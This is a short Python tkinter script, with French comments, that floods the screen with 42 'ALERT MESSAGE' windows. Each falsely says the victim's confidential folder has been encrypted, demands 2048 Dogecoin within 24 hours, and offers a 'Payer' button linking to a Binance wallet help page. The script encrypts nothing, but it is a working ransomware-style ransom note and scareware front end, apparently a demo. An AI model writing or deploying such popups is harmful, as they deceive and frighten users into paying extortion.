import tkinter as tk
import webbrowser
from random import randint

def link():
    webbrowser.open("https://www.binance.com/en/support/faq/how-to-send-and-receive-tokens-on-binance-web3-wallet-02f7eb872eca4a1ea44c775767170d13")

def show_popup():
    screen_width = 1920
    screen_height = 1080

    popups = [] #Liste des pop-up à générer

    for i in range(42):
        # On ouvre une fenêtre
        popup = tk.Tk()
        popup.wm_title("ALERT MESSAGE")

        # On ajoute un p'tit message
        message = "Nous avons chiffré votre dossier_confidentiel.\n Afin de récupérer vos données, vous devez payer une rançon d'une valeur de 2048 Dogecoin. \n Vous avez 24 heures avant suppression définitive de vos données."
        label = tk.Label(popup, text=message, padx=20, pady=20)
        label.pack()

        # On créer un boutton pour payer
        link_button = tk.Button(popup, text="Payer", command=link, padx=10, pady=5)
        link_button.pack()

        x = randint(0, screen_width - 300)
        y = randint(0, screen_height - 200)
        popup.geometry(f"+{x}+{y}")

        popups.append(popup)

    tk.mainloop()


show_popup()